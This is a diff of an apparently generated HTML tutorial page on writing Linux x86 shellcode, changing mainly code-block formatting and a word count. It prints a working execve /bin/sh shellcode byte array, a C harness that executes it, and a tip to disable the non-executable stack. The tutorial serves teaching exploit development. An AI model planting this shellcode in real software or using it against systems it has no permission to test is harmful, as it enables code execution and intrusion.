@@ -185,7 +185,7 @@
   Calculate the post's reading time, and display the word count in tooltip
  --><!-- words per minute  --><!-- return element -->
 <span class="readtime" data-toggle="tooltip" data-placement="bottom"
-  title="1824 words">
+  title="1844 words">
   <em>10 min</em> read</span>
 <!-- page views --></div>
 
@@ -263,8 +263,9 @@ loc1:
 
 <p>With that in mind, we can write a simple injectable shellcode that uses <code class="language-plaintext highlighter-rouge">execve()</code> syscall to spawn a <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell. <code class="language-plaintext highlighter-rouge">execve()</code> is defined in the <code class="language-plaintext highlighter-rouge">unistd.h</code> header file, and is used to execute other programs. The function accepts three arguments;</p>
 
-<pre><code class="language-C">int execve(const char *pathname, char *const argv[], char *const envp[]);
-</code></pre>
+<div class="language-c highlighter-rouge"><div class="code-header"><span label-text="C"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">execve</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pathname</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">envp</span><span class="p">[]);</span>
+</pre></td></tr></tbody></table></code></div></div>
 
 <ol>
   <li><code class="language-plaintext highlighter-rouge">pathname</code>: This is the full path of the program you want to execute.</li>
@@ -449,30 +450,49 @@ ld -m elf_i386 test.o -o test
 </pre></td><td class="rouge-code"><pre>xxd -i shellcode.bin
 </pre></td></tr></tbody></table></code></div></div>
 
-<pre><code class="language-C">unsigned char shellcode_bin[] = {
-  0xeb, 0x18, 0x5b, 0x31, 0xc0, 0xff, 0x73, 0x04, 0xff, 0x33, 0x88, 0x44,
-  0x24, 0x07, 0x89, 0xe3, 0x89, 0xc2, 0x50, 0x53, 0x89, 0xe1, 0xb0, 0x0b,
-  0xcd, 0x80, 0xe8, 0xe3, 0xff, 0xff, 0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f,
-  0x73, 0x68, 0x41
-};
-</code></pre>
+<div class="language-c highlighter-rouge"><div class="code-header"><span label-text="C"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode_bin</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
+  <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span>
+  <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span>
+  <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x41</span>
+<span class="p">};</span>
+</pre></td></tr></tbody></table></code></div></div>
 
 <p>We can now write a simple tester for the above shellcode;</p>
 
-<pre><code class="language-C">#include &lt;stdio.h&gt;
+<div class="language-c highlighter-rouge"><div class="code-header"><span label-text="C"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre><span class="cp">#include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
-
-void main(){
-  unsigned char shellcode_bin[] = {
-    0xeb, 0x18, 0x5b, 0x31, 0xc0, 0xff, 0x73, 0x04, 0xff, 0x33, 0x88, 0x44,
-  0x24, 0x07, 0x89, 0xe3, 0x89, 0xc2, 0x50, 0x53, 0x89, 0xe1, 0xb0, 0x0b,
-    0xcd, 0x80, 0xe8, 0xe3, 0xff, 0xff, 0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f,
-    0x73, 0x68, 0x41
-  };
-  int (*ret)() = (int(*)())shellcode_bin;
-  ret();
-}
-</code></pre>
+</span>
+<span class="kt">void</span> <span class="nf">main</span><span class="p">(){</span>
+  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode_bin</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
+  <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span>
+    <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span>
+    <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x41</span>
+  <span class="p">};</span>
+  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">shellcode_bin</span><span class="p">;</span>
+  <span class="n">ret</span><span class="p">();</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></div></div>
 
 <p>Compile the program. Make sure you disable NX (non-executable stack) with <code class="language-plaintext highlighter-rouge">-z execstack</code> flag or the program will segfault;</p>
 
